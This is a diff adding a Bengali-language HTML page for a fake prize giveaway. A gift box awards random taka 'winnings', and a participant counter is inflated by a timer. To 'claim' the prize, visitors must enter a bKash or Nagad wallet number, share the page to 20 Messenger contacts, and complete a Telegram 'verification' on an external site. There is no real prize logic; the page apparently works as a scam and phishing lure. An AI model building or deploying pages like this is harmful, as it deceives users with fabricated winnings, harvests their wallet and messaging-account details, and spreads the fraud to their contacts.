@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="icon" href="https://i.ibb.co/1GcLJSJ6/images-4.jpg" type="image/png">
+  <title>আকর্ষণীয় উপহার জেতেন</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: radial-gradient(circle, #fff6e5, #ffe1c3);
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      font-size: 16px;
+      -webkit-text-size-adjust: 100%;
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      margin: 0.5em 0;
+    }
+    
+    h2 {
+      font-size: 1.5rem;
+      margin: 0.5em 0;
+    }
+    
+    p {
+      font-size: 1.1rem;
+      margin: 0.5em 0;
+      line-height: 1.5;
+    }
+
+    .counter {
+      margin-top: 15px;
+      font-size: 1.3rem;
+      color: #e74c3c;
+      font-weight: bold;
+    }
+
+    #loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #f39c12;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .intro-box {
+      padding: 20px;
+      text-align: left;
+      max-width: 800px;
+      margin: 20px auto;
+      background: #fff9ed;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    .intro-box h2 {
+      color: #e67e22;
+    }
+
+    .box-wrapper {
+      position: relative;
+      display: inline-block;
+      margin-top: 30px;
+      cursor: pointer;
+      display: none;
+      width: 200px;
+      height: 200px;
+    }
+
+    .box-img {
+      width: 100%;
+      height: 100%;
+      transition: transform 1s ease, opacity 1s ease;
+      transform-origin: center;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+
+    .box-wrapper.opened .box-img {
+      animation: explode 0.8s forwards;
+    }
+
+    @keyframes explode {
+      0% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(3) rotate(180deg); opacity: 0; }
+    }
+
+    .prize-text {
+      display: none;
+      font-size: 1.8rem;
+      font-weight: bold;
+      color: #e67e22;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100%;
+      text-align: center;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+      background: rgba(255,255,255,0.8);
+      padding: 15px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(230,126,34,0.5);
+      z-index: 10;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.1); }
+      100% { transform: translate(-50%, -50%) scale(1); }
+    }
+
+    .confetti-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 5;
+      overflow: hidden;
+    }
+
+    .confetti {
+      position: absolute;
+      width: 12px;
+      height: 12px;
+      opacity: 0;
+      animation: confetti-fall 3s linear forwards;
+    }
+
+    @keyframes confetti-fall {
+      0% {
+        transform: translateY(-100px) rotate(0deg);
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(100vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    .popup {
+      display: none;
+      margin-top: 20px;
+      animation: popupShow 0.6s ease forwards;
+      transform: scale(0);
+      z-index: 20;
+    }
+
+    @keyframes popupShow {
+      to {
+        transform: scale(1);
+      }
+    }
+
+    .popup-box {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      display: inline-block;
+      animation: fadeIn 0.5s ease-in;
+      max-width: 90%;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .popup-box h2 {
+      color: green;
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+    }
+
+    .task-list {
+      margin-top: 15px;
+      text-align: left;
+    }
+
+    .task-list li {
+      margin-bottom: 15px;
+      font-size: 1.1rem;
+      background: #f9f9f9;
+      padding: 12px;
+      border-radius: 8px;
+    }
+
+    .task-list button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1.1rem;
+      width: 100%;
+      transition: background-color 0.3s;
+    }
+
+    .task-list button:hover {
+      background-color: #2980b9;
+    }
+
+    .disabled {
+      background-color: #ccc !important;
+      cursor: not-allowed !important;
+    }
+
+    .completed {
+      background-color: #e8f5e9 !important;
+    }
+
+    .completed:before {
+      content: "✓ ";
+      color: #2ecc71;
+    }
+
+    .payment-option {
+      margin-top: 10px;
+      display: none;
+    }
+
+    .payment-option.active {
+      display: block;
+      animation: fadeIn 0.5s;
+    }
+
+    .payment-option select, 
+    .payment-option input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1.1rem;
+    }
+
+    .payment-option button {
+      margin-top: 10px;
+      background-color: #27ae60;
+    }
+
+    .payment-option button:hover {
+      background-color: #219955;
+    }
+
+    .task-progress {
+      margin-top: 20px;
+      background: #f1f1f1;
+      border-radius: 10px;
+      padding: 10px;
+    }
+
+    .progress-bar {
+      height: 10px;
+      background: #e0e0e0;
+      border-radius: 5px;
+      margin-top: 10px;
+      overflow: hidden;
+    }
+
+    .progress {
+      height: 100%;
+      background: #3498db;
+      width: 0%;
+      transition: width 0.5s;
+    }
+
+    .footer-image {
+      margin: 30px auto;
+      max-width: 90%;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+
+    @media (max-width: 480px) {
+      body {
+        font-size: 14px;
+      }
+      
+      h1 {
+        font-size: 1.5rem;
+        padding: 0 10px;
+      }
+      
+      h2 {
+        font-size: 1.3rem;
+      }
+      
+      p {
+        font-size: 1rem;
+      }
+      
+      .popup-box h2 {
+        font-size: 1.3rem;
+      }
+      
+      .task-list li {
+        font-size: 1rem;
+        padding: 10px;
+      }
+      
+      .counter {
+        font-size: 1.1rem;
+      }
+      
+      .box-wrapper {
+        width: 150px;
+        height: 150px;
+      }
+      
+      .prize-text {
+        font-size: 1.4rem;
+        padding: 10px;
+      }
+      
+      .task-list button {
+        font-size: 1rem;
+      }
+      
+      .payment-option select, 
+      .payment-option input {
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="loader">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="confetti-container" id="confettiContainer"></div>
+
+  <div class="intro-box">
+    <h2>আকর্ষণীয় উপহার জেতার সুযোগ জিতুন!</h2>
+    <p>
+      এই সীমিত সময়ের অফারে আপনি আকর্ষণীয় উপহার পেতে পারেন। অংশগ্রহণকারীদের জন্য রয়েছে ১০০০০ টাকা জেতার সুযোগ! দেরি না করে আজই আপনার ভাগ্যের চাকা ঘুরিয়ে নিন।
+    </p>
+    <p>
+      <strong>আপনার করণীয়:</strong><br>
+      ✅ একটি বক্সে ক্লিক করে আপনার আকর্ষণীয় উপহার খুঁজুন<br>
+      ✅ আপনি আপনার আকর্ষণীয় উপহার পেয়ে যাবেন<br>
+      ✅ উপহার পাওয়ার জন্য **Messenger-এ শেয়ার করুন** এবং আপনার বন্ধুদের আমন্ত্রণ জানান<br>
+      ✅ বাকি কাজগুলো শেষ করে ভেরিফাই না হলে আপনার একাউন্টে কোনো টাকা পাঠানো হবে না
+    </p>
+    <p style="color: #27ae60;">
+      **দ্রষ্টব্য:** আপনি যতবার ইচ্ছা ততবার এই কাজটি করতে পারবেন না। সুতরাং, আপনার ভাগ্য পরীক্ষা করুন!
+    </p>
+  </div>
+
+  <div class="counter" id="counter">
+    মোট অংশগ্রহণকারী: 82837 জন
+  </div>
+
+  <h1>আপনার আকর্ষণীয় উপহার জেতার জন্য বক্সটি খুলুন!🎁👇</h1>
+
+  <div class="box-wrapper" onclick="openGift()" id="giftBox">
+    <img src="https://i.ibb.co/d0s3g6Tp/collection-3d-gift-boxes-91128-1024-removebg-preview.png" class="box-img" id="giftImage" alt="Gift Box">
+    <div class="prize-text" id="prizeText"></div>
+  </div>
+
+  <div class="popup" id="popup">
+    <div class="popup-box">
+      <h2>অভিনন্দন! আপনার পুরুষ্কারের অর্থ পেতে অবশ্যয় নিচের টাক্স গুলো কম্পিলিট করে ভেরিফাই  করতে হবে💢</h2>
+      
+      <div class="task-progress">
+        <div>টাস্ক সম্পূর্ণ হয়েছে: <span id="completedTasks">0</span>/3</div>
+        <div class="progress-bar">
+          <div class="progress" id="progressBar"></div>
+        </div>
+      </div>
+
+      <div class="task-list">
+        <ul>
+          <li id="task1Item">
+            <b>টাস্ক ১: পেমেন্ট মেথড সিলেক্ট করুন</b>
+            <p>আপনার বিকাশ/নগদ নম্বর দিন</p>
+            <button onclick="showPaymentOptions()" id="task1Btn">পেমেন্ট মেথড সিলেক্ট করুন</button>
+            
+            <div class="payment-option" id="paymentOption">
+              <select id="paymentMethod">
+                <option value="">পেমেন্ট মেথড সিলেক্ট করুন</option>
+                <option value="bkash">বিকাশ</option>
+                <option value="nagad">নগদ</option>
+              </select>
+              <input type="text" id="phoneNumber" placeholder="মোবাইল নম্বর দিন (01XXXXXXXXX)" pattern="[0-9]{11}">
+              <button onclick="submitPaymentInfo()">সাবমিট করুন</button>
+            </div>
+          </li>
+
+          <li id="task2Item">
+            <b>টাস্ক ২: Messenger-এ শেয়ার করুন</b>
+            <p>আপনার বিজয় নিশ্চিত করতে ২০ জনকে শেয়ার করুন</p>
+            <button onclick="shareMessenger()" id="task2Btn" class="disabled" disabled>শেয়ার করুন</button>
+          </li>
+
+          <li id="task3Item">
+            <b>টাস্ক ৩: টেলিগ্রাম ভেরিফিকেশন</b>
+            <p> আপনার টেলিগ্রাম নাম্বার দিয়ে ভেরিফাই করে আমাদের ভেরিফাই ইউজার হয়ে যান</p>
+            <button onclick="verifyTelegram()" id="task3Btn" class="disabled" disabled>ভেরিফাই করুন</button>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer-image">
+    <img src="https://i.ibb.co/7JMfG50K/1751478334056.jpg" alt="বিশেষ অফারের ছবি" style="max-width: 100%;">
+  </div>
+
+  <script>
+    const prizes = [
+      {amount: 500, emoji: "💰", color: "#f1c40f"}, 
+      {amount: 1000, emoji: "🎁", color: "#e74c3c"},
+      {amount: 1500, emoji: "💵", color: "#2ecc71"},
+      {amount: 2000, emoji: "💎", color: "#9b59b6"},
+      {amount: 5000, emoji: "🏆", color: "#e67e22"},
+      {amount: 10000, emoji: "🤑", color: "#3498db"}
+    ];
+    let opened = false;
+    let completedTasks = 0;
+
+    window.onload = function () {
+      const img = document.getElementById("giftImage");
+      if (img.complete) {
+        showContent();
+      } else {
+        img.onload = showContent;
+      }
+
+      startCounter();
+    }
+
+    function showContent() {
+      document.getElementById("loader").style.display = "none";
+      document.getElementById("giftBox").style.display = "inline-block";
+    }
+
+    function openGift() {
+      if (opened) return;
+
+      document.getElementById("giftBox").classList.add("opened");
+
+      const prize = prizes[Math.floor(Math.random() * prizes.length)];
+
+      setTimeout(() => {
+        const prizeText = document.getElementById("prizeText");
+        prizeText.style.display = "block";
+        prizeText.style.color = prize.color;
+        prizeText.innerHTML = `অভিনন্দন! <span class="emoji">${prize.emoji}</span><br>${prize.amount} টাকা জিতেছেন! <span class="emoji">🎉</span>`;
+        
+        createAdvancedConfetti(prize.color);
+        
+        setTimeout(() => {
+          document.getElementById("popup").style.display = "block";
+          updateTaskProgress();
+        }, 2000);
+      }, 800);
+
+      opened = true;
+    }
+
+    function createAdvancedConfetti(baseColor) {
+      const colors = [
+        "#f1c40f", "#e74c3c", "#2ecc71", 
+        "#9b59b6", "#3498db", "#e67e22",
+        "#1abc9c", "#d35400", "#34495e"
+      ];
+      
+      const container = document.getElementById("confettiContainer");
+      container.innerHTML = '';
+      
+      for(let i = 0; i < 150; i++) {
+        const confetti = document.createElement("div");
+        confetti.className = "confetti";
+        
+        const shape = Math.random();
+        if(shape < 0.3) {
+          confetti.style.borderRadius = "50%";
+        } else if(shape < 0.6) {
+          confetti.style.clipPath = "polygon(50% 0%, 0% 100%, 100% 100%)";
+        }
+        
+        confetti.style.backgroundColor = Math.random() > 0.7 ? baseColor : colors[Math.floor(Math.random() * colors.length)];
+        
+        const size = 8 + Math.random() * 10;
+        confetti.style.width = `${size}px`;
+        confetti.style.height = `${size}px`;
+        
+        confetti.style.left = `${Math.random() * 100}vw`;
+        confetti.style.top = "-20px";
+        
+        const rotation = Math.random() * 360;
+        confetti.style.transform = `rotate(${rotation}deg)`;
+        
+        const duration = 3 + Math.random() * 4;
+        const delay = Math.random() * 2;
+        confetti.style.animation = `confetti-fall ${duration}s linear ${delay}s forwards`;
+        
+        container.appendChild(confetti);
+      }
+    }
+
+    function showPaymentOptions() {
+      document.getElementById("paymentOption").classList.add("active");
+    }
+
+    function submitPaymentInfo() {
+      const method = document.getElementById("paymentMethod").value;
+      const phone = document.getElementById("phoneNumber").value;
+      
+      if(!method) {
+        alert("দয়া করে একটি পেমেন্ট মেথড সিলেক্ট করুন");
+        return;
+      }
+      
+      if(!phone.match(/^01[3-9]\d{8}$/)) {
+        alert("দয়া করে একটি সঠিক মোবাইল নম্বর দিন (11 ডিজিট)");
+        return;
+      }
+      
+      // Mark task as completed
+      document.getElementById("task1Item").classList.add("completed");
+      document.getElementById("task1Btn").style.display = "none";
+      document.getElementById("paymentOption").style.display = "none";
+      
+      // Enable next task
+      document.getElementById("task2Btn").disabled = false;
+      document.getElementById("task2Btn").classList.remove("disabled");
+      
+      completedTasks++;
+      updateTaskProgress();
+      
+      alert(`ধন্যবাদ! আপনার ${method === 'bkash' ? 'বিকাশ' : 'নগদ'} নম্বর রেজিস্টার করা হয়েছে: ${phone}`);
+    }
+
+    function shareMessenger() {
+      const shareUrl = window.location.href;
+      
+      // শুধুমাত্র Messenger অ্যাপ খোলার চেষ্টা করুন
+      const appUrl = `fb-messenger://share?link=${encodeURIComponent(shareUrl)}`;
+      
+      // একটি লুকানো iframe তৈরি করুন যা অ্যাপ খোলার চেষ্টা করবে
+      const iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.src = appUrl;
+      document.body.appendChild(iframe);
+
+      // কিছু সময় পর iframe টি সরিয়ে দিন
+      setTimeout(function() {
+        document.body.removeChild(iframe);
+      }, 500); // অ্যাপ খোলার জন্য একটি ছোট সময় দিন (যেমন 500ms)
+      
+      // টাস্কটি সম্পূর্ণ হিসাবে চিহ্নিত করুন (শেয়ারিং শুরু হয়েছে ধরে নিয়ে)
+      setTimeout(() => {
+        document.getElementById("task2Item").classList.add("completed");
+        document.getElementById("task2Btn").style.display = "none";
+        
+        // পরবর্তী টাস্ক সক্ষম করুন
+        document.getElementById("task3Btn").disabled = false;
+        document.getElementById("task3Btn").classList.remove("disabled");
+        
+        completedTasks++;
+        updateTaskProgress();
+      }, 2000); // ব্যবহারকারীকে Messenger অ্যাপে শেয়ার করার জন্য কিছুটা বেশি সময় দিন
+    }
+
+    function verifyTelegram() {
+      // Open Telegram verification in new tab
+      window.open("https://verify-tg.onrender.com", "_blank");
+      
+      // Mark task as completed
+      document.getElementById("task3Item").classList.add("completed");
+      document.getElementById("task3Btn").style.display = "none";
+      
+      completedTasks++;
+      updateTaskProgress();
+      
+      alert("টেলিগ্রাম ভেরিফিকেশন পেজ খোলা হয়েছে। দয়া করে ভেরিফিকেশন প্রক্রিয়া সম্পন্ন করুন।");
+    }
+
+    function updateTaskProgress() {
+      document.getElementById("completedTasks").textContent = completedTasks;
+      const progress = (completedTasks / 3) * 100;
+      document.getElementById("progressBar").style.width = `${progress}%`;
+      
+      // If all tasks completed, show congratulations
+      if (completedTasks === 3) {
+        setTimeout(() => {
+          alert("অভিনন্দন! আপনি সব টাস্ক সম্পূর্ণ করেছেন। আপনার পুরস্কার শীঘ্রই পাঠানো হবে।");
+        }, 1000);
+      }
+    }
+
+    function startCounter() {
+      let count = 82837;
+      const counterElement = document.getElementById("counter");
+      setInterval(() => {
+        const increase = [4, 7, 10][Math.floor(Math.random() * 3)];
+        count += increase;
+        counterElement.innerText = `মোট অংশগ্রহণকারী: ${count} জন`;
+      }, 2000);
+    }
+  </script>
+
+</body>
+</html>
